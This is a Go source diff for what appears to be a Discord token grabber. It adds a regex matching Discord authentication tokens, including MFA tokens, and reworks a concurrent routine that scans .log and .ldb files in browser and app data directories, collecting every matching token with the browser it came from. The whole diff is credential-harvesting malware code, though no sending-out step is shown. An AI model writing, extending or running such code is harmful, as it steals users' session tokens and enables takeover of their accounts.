@@ -3,6 +3,7 @@ package main
 import (
 	"log"
 	"os"
+	"regexp"
 	"strings"
 	"sync"
 )
@@ -12,10 +13,19 @@ type TOKEN struct {
 	token   string
 }
 
-func ExtractTokens() []string {
+func FindAllTokens(input string) []string {
+	Expression, e := regexp.Compile("([\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{38})|(mfa\\.[\\w-]{84})")
+	if e != nil {
+		log.Fatalf(e.Error())
+	}
+
+	return Expression.FindAllString(input, -1)
+}
+
+func ExtractTokens() []TOKEN {
 
 	var WG sync.WaitGroup
-	var T []string
+	var T []TOKEN
 
 	for _, Path := range PLATFORMS {
 		if !FileExists(Path.DataFiles) {
@@ -28,11 +38,12 @@ func ExtractTokens() []string {
 		for _, File := range items {
 			FName := File.Name()
 			var t []string
+			// if the file isn't a log or db file, ignore it
 			if File.IsDir() || (!strings.HasSuffix(FName, ".log") && !strings.HasSuffix(FName, ".ldb")) {
 				continue
 			}
 
-			// Do stuff here
+			// asynchronous regex locator
 			WG.Add(1)
 			go func(FName string) {
 				defer WG.Done()
@@ -45,7 +56,13 @@ func ExtractTokens() []string {
 				t = FindAllTokens(string(b))
 
 				if len(t) > 0 {
-					T = append(T, t...)
+					// iterate through any/all tokens found
+					for _, tk := range t {
+						T = append(T, TOKEN{
+							browser: Path.Name,
+							token:   tk,
+						})
+					}
 				}
 			}(FName)
 		}
